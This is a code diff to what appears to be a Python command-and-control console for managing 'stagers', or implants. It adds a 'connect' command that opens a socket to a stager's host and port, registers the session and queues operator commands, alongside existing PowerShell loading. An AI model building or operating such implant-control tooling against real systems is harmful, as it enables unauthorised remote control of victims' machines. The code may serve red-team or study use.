@@ -22,6 +22,8 @@ def setautocomplete(words):
     completer = VolcabCompleter(words)
     readline.set_completer(completer.complete)
 
+def removecomplete():
+    readline.set_completer()
 
 class myconstant():
     def __init__(self):
@@ -46,15 +48,19 @@ class myconstant():
         self.CMD_LISTENER_LIST = "list"
         self.CMD_LISTENER_STOP = "stop"
         self.CMD_LISTENER_AUTOLIST = [self.CMD_BACK,self.CMD_LISTENER_GETINFO,self.CMD_LISTENER_SETHOSTNAME,
-                                        self.CMD_LISTENER_SETPORT,self.CMD_LISTENER_START,self.CMD_LISTENER_LIST,self.CMD_LISTENER_STOP,self.CMD_HELP]
+                                    self.CMD_LISTENER_SETPORT,self.CMD_LISTENER_START,self.CMD_LISTENER_LIST,self.CMD_LISTENER_STOP,self.CMD_HELP]
 
         self.CMD_STAGER_GET_LIST = "list"
         #self.CMD_STAGER_GET_RUNNING_LIST = "rlist"
         self.CMD_STAGER_GET_INTO = "into"
         self.CMD_STAGER_GET_HISTORY = "history"
         self.CMD_STAGER_LOAD_PS = "psload"
+        self.CMD_STAGER_CON = "connect"
         #self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
-        self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_INTO,self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS]
+        self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_INTO,
+                                    self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON]
+
+
 
 
 
@@ -207,6 +213,37 @@ class myserver():
                 myhistory.append("[Stager] {} is stoped ...".format(myuuid))
                 myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                 break
+
+    
+    def start_client(self,conhost,conport):
+        print("Trying to connect to Host: {} and Port: {}".format(conhost,conport))
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            client.connect((conhost,conport))
+        except Exception as e:
+            print("Error connecting to client: {}...".format(str(e)))
+            return
+        
+        #get uuid and normal setup
+        print("[Client] Connected to", conhost)
+        #get uuid
+        myuuid = uuid.uuid4().hex[:6].upper()
+        #push socket into dict
+        self.__mysocket_list[myuuid] = client
+        #push addr into dict
+        self.__myaddr_list[myuuid] = (conhost,conport) #may or may not the same format 
+        #create fifo
+        self.__mydata_list[myuuid] = queue.Queue()
+        #create history
+        self.__mymsg_list[myuuid] = list()
+        #push uuid
+        self.__myuuid_list.append(myuuid)
+        #set start
+        self.__mystart_list[myuuid] = True
+        print("[Client] myuuid is {}".format(myuuid))
+        threading.Thread(target=self.start_worker,args=(myuuid,)).start()
+
+
 
 
     def start_listener(self):
@@ -464,6 +501,9 @@ class mymainclass():
                     if user_input_stager not in self.__t_myserver.get_stager():
                         print("Please input a valid stager uuid")
                         continue
+
+                    #unset auto complete
+                    removecomplete()
                     user_input_command_tag = input("Please enter the command tag: ")
                     user_input_command = input("Please enter the command: ")
                     self.__t_myserver.create_command(user_input_stager,user_input_command_tag,user_input_command)
@@ -486,6 +526,13 @@ class mymainclass():
                     #call psrun with tag psload
                     self.__t_myserver.create_command(user_input_stager,"psload",t_result)
 
+                if command_id == self.__t_myconstant.CMD_STAGER_CON:
+                    #unset auto complete
+                    removecomplete()
+                    #get host and port
+                    user_input_host = input("Please enter hostname or ip: ")
+                    user_input_port = input("Please enter portnumber: ")
+                    self.__t_myserver.start_client(user_input_host,int(user_input_port))
 
 
 
